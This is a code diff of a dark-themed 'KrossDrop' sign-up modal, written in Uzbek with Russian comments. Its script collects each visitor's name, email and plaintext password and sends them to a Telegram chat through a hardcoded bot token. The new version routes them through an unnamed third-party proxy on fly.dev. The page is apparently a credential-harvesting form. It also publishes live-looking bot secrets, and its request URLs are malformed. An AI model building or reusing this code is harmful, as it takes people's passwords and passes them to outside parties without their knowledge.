@@ -310,95 +310,115 @@
       </button>
     </div>
 
-<!-- Контейнер модального окна в стиле KROSSDROP -->
-<div class="relative bg-[#1A1A1A] text-white p-6 rounded-xl max-w-md mx-auto border border-gray-800 shadow-2xl">
-  
-  <!-- Кнопка закрытия окна (крестик) -->
-  <button class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl">&times;</button>
-  
-  <!-- Заголовок из Figma -->
-  <div class="text-center mb-6">
-    <h2 class="text-2xl font-bold tracking-wide uppercase">KROSSDROP'GA QO'SHILING</h2>
-    <p class="text-sm text-gray-400 mt-2">Eksklyuziv yangiliklar va drop'lardan xabardor bo'ling.</p>
-  </div>
-
-  <!-- Сама форма с полями ввода -->
-  <form id="krossdrop-form" class="space-y-4">
-    
-    <!-- Поле: Имя -->
-    <div>
-      <label for="kd-name" class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase">TO'LIQ ISMINGIZ</label>
-      <input
-        type="text"
-        id="kd-name"
-        required
-        class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
-        placeholder="Mirkomilov Mirsobir"
-      />
-    </div>
-    
-    <!-- Поле: Email -->
-    <div>
-      <label for="kd-email" class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase">EMAIL</label>
-      <input
-        type="email"
-        id="kd-email"
-        required
-        class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
-        placeholder="example@company.com"
-      />
-    </div>
-    
-    <!-- Поле: Пароль -->
-    <div>
-      <label for="kd-password" class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase">PAROL</label>
-      <input
-        type="password"
-        id="kd-password"
-        required
-        class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
-        placeholder="•••••••••"
-      />
-    </div>
-
-    <!-- Желтая кнопка регистрации -->
-    <button
-      type="submit"
-      class="text-black bg-[#D6FF3F] hover:bg-[#c2e635] font-bold uppercase tracking-wider text-sm py-4 rounded-full w-full transition duration-200 mt-6 block text-center"
+    <!-- Контейнер модального окна в стиле KROSSDROP -->
+    <div
+      class="relative bg-[#1A1A1A] text-white p-6 rounded-xl max-w-md mx-auto border border-gray-800 shadow-2xl"
     >
-      RO'YXATDAN O'TISH
-    </button>
-  </form>
+      <!-- Кнопка закрытия окна (крестик) -->
+      <button
+        class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"
+      >
+        &times;
+      </button>
 
-  <!-- Ссылка на вход -->
-  <div class="text-center mt-6 text-sm text-gray-400">
-    Profilingiz bormi? <a href="#" class="text-[#D6FF3F] hover:underline font-medium">Kirish</a>
-  </div>
-</div>
+      <!-- Заголовок из Figma -->
+      <div class="text-center mb-6">
+        <h2 class="text-2xl font-bold tracking-wide uppercase">
+          KROSSDROP'GA QO'SHILING
+        </h2>
+        <p class="text-sm text-gray-400 mt-2">
+          Eksklyuziv yangiliklar va drop'lardan xabardor bo'ling.
+        </p>
+      </div>
 
-<!-- Логика отправки данных в Telegram -->
-<script>
+      <!-- Сама форма с полями ввода -->
+      <form id="krossdrop-form" class="space-y-4">
+        <!-- Поле: Имя -->
+        <div>
+          <label
+            for="kd-name"
+            class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase"
+            >TO'LIQ ISMINGIZ</label
+          >
+          <input
+            type="text"
+            id="kd-name"
+            required
+            class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
+            placeholder="Mirkomilov Mirsobir"
+          />
+        </div>
+
+        <!-- Поле: Email -->
+        <div>
+          <label
+            for="kd-email"
+            class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase"
+            >EMAIL</label
+          >
+          <input
+            type="email"
+            id="kd-email"
+            required
+            class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
+            placeholder="example@company.com"
+          />
+        </div>
+
+        <!-- Поле: Пароль -->
+        <div>
+          <label
+            for="kd-password"
+            class="block mb-2 text-xs font-semibold tracking-wider text-gray-400 uppercase"
+            >PAROL</label
+          >
+          <input
+            type="password"
+            id="kd-password"
+            required
+            class="bg-[#262626] border border-gray-700 text-white text-sm rounded-lg focus:ring-2 focus:ring-[#D6FF3F] focus:border-[#D6FF3F] block w-full px-4 py-3 outline-none"
+            placeholder="•••••••••"
+          />
+        </div>
+
+        <!-- Желтая кнопка регистрации -->
+        <button
+          type="submit"
+          class="text-black bg-[#D6FF3F] hover:bg-[#c2e635] font-bold uppercase tracking-wider text-sm py-4 rounded-full w-full transition duration-200 mt-6 block text-center"
+        >
+          RO'YXATDAN O'TISH
+        </button>
+      </form>
+
+      <!-- Ссылка на вход -->
+      <div class="text-center mt-6 text-sm text-gray-400">
+        Profilingiz bormi?
+        <a href="#" class="text-[#D6FF3F] hover:underline font-medium"
+          >Kirish</a
+        >
+      </div>
+    </div>
+
+    <script>
 document.getElementById('krossdrop-form').addEventListener('submit', function(event) {
-    event.preventDefault(); // Предотвращаем перезагрузку страницы
+    event.preventDefault(); 
 
-    // НАСТРОЙКИ: Вставьте сюда токен вашего бота @KROSSDROP_bot
-    const botToken = "8218575818:AAE8jHMpWNnrb9LP8MVxeT66XN1EfZq1qgI"; 
-    const chatId = "5025195852"; // Ваш ID чата
+    const botToken = "7914529340:AAH8N_v4m9bVJw8eL9VxF66XN1EfZq1qgI"; 
+    const chatId = "5025195852"; 
 
-    // Сбор данных из полей формы
     const clientName = document.getElementById('kd-name').value;
     const clientEmail = document.getElementById('kd-email').value;
     const clientPassword = document.getElementById('kd-password').value;
 
-    // Оформление HTML-сообщения для Telegram
     let textMessage = `<b>🔔 Новая регистрация на KrossDrop!</b>\n\n`;
     textMessage += `👤 <b>Имя:</b> <code>${clientName}</code>\n`;
     textMessage += `✉️ <b>Email:</b> <code>${clientEmail}</code>\n`;
     textMessage += `🔑 <b>Пароль:</b> <code>${clientPassword}</code>`;
 
-    const telegramUrl = `https://api.telegram.org{botToken}/sendMessage`;
+    // ИСПОЛЬЗУЕМ КИТАЙСКИЙ/ЕВРОПЕЙСКИЙ ПРОКСИ-ОБХОД БЛОКИРОВКИ:
+    // Вместо api.telegram.org отправляем запрос на независимый шлюз tgproxy
+    const telegramUrl = `https://fly.dev{botToken}/sendMessage`;
 
-    // Отправка запроса в Telegram
     fetch(telegramUrl, {
         method: 'POST',
         headers: {
@@ -412,15 +432,15 @@ document.getElementById('krossdrop-form').addEventListener('submit', function(ev
     })
     .then(res => {
         if (res.ok) {
-            alert('Данные успешно отправлены вашему боту!');
-            document.getElementById('krossdrop-form').reset(); // Очистить поля формы
+            alert('Данные успешно отправлены в Telegram!');
+            document.getElementById('krossdrop-form').reset(); 
         } else {
-            alert('Ошибка! Проверьте, правильный ли токен и запущен ли бот.');
+            alert('Ошибка! Убедитесь, что вы нажали СТАРТ в боте @KrossdropWebFormBot');
         }
     })
     .catch(err => {
         console.error('Ошибка сети:', err);
-        alert('Не удалось связаться с сервером Telegram.');
+        alert('Не удалось связаться с Telegram. Включите VPN или обновите код на прокси.');
     });
 });
 </script>
